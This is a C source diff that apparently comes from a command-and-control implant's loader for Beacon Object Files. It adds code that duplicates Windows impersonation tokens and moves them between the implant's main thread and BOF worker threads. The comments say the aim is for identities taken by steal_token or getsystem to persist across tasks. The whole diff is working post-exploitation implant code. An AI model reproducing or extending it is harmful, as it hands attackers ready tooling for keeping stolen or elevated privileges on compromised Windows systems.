@@ -413,6 +413,8 @@ typedef struct {
     BofEntryFunc entry;
     char        *args;
     int          args_len;
+    HANDLE       hImpToken;   /* captured impersonation token from BOF thread */
+    HANDLE       hInToken;    /* main thread's impersonation to apply before BOF runs */
 } BOF_THREAD_CTX;
 
 /* Globals for VEH ↔ thread communication */
@@ -439,7 +441,32 @@ static LONG CALLBACK bof_veh_handler(PEXCEPTION_POINTERS ep) {
 
 static DWORD WINAPI bof_thread_proc(LPVOID param) {
     BOF_THREAD_CTX *ctx = (BOF_THREAD_CTX *)param;
+
+    /* If the main thread was impersonating (e.g. after steal_token),
+     * apply that identity so the BOF inherits it — CreateThread does
+     * NOT propagate thread impersonation tokens to child threads. */
+    if (ctx->hInToken) {
+        ImpersonateLoggedOnUser(ctx->hInToken);
+        CloseHandle(ctx->hInToken);
+        ctx->hInToken = NULL;
+    }
+
     ctx->entry(ctx->args, ctx->args_len);
+
+    /* If the BOF set thread impersonation (getsystem, steal_token),
+     * capture the token before this thread exits — the main thread
+     * will re-apply it so the impersonation persists across tasks. */
+    HANDLE hTok = NULL;
+    if (OpenThreadToken(GetCurrentThread(),
+                        TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY,
+                        FALSE, &hTok)) {
+        HANDLE hDup = NULL;
+        if (DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL,
+                             SecurityImpersonation, TokenImpersonation, &hDup)) {
+            ctx->hImpToken = hDup;
+        }
+        CloseHandle(hTok);
+    }
     return 0;
 }
 
@@ -849,6 +876,24 @@ BOOL coff_load_and_execute(
         tctx.entry    = entry;
         tctx.args     = (char *)arg_data;
         tctx.args_len = (int)arg_len;
+        tctx.hImpToken = NULL;
+        tctx.hInToken  = NULL;
+
+        /* If the main thread is impersonating, pass that token to the
+         * worker thread so the BOF runs under the same identity. */
+        {
+            HANDLE hCurTok = NULL;
+            if (OpenThreadToken(GetCurrentThread(),
+                                TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY,
+                                FALSE, &hCurTok)) {
+                HANDLE hDup = NULL;
+                if (DuplicateTokenEx(hCurTok, MAXIMUM_ALLOWED, NULL,
+                                     SecurityImpersonation, TokenImpersonation, &hDup)) {
+                    tctx.hInToken = hDup;
+                }
+                CloseHandle(hCurTok);
+            }
+        }
 
         /* Reset crash state */
         g_bof_crashed        = 0;
@@ -874,6 +919,15 @@ BOOL coff_load_and_execute(
                 BeaconPrintf(0x0d, "[!] COFF: BOF timed out after 300s — thread terminated\n");
             } else {
                 CloseHandle(hThread);
+
+                /* If the BOF captured an impersonation token, apply it to
+                 * the main thread so capture_thread_token() picks it up */
+                if (tctx.hImpToken) {
+                    ImpersonateLoggedOnUser(tctx.hImpToken);
+                    CloseHandle(tctx.hImpToken);
+                    tctx.hImpToken = NULL;
+                }
+
                 if (g_bof_crashed) {
                     BeaconPrintf(0x0d,
                         "[!] COFF: BOF crashed with exception 0x%08X at address %p\n",
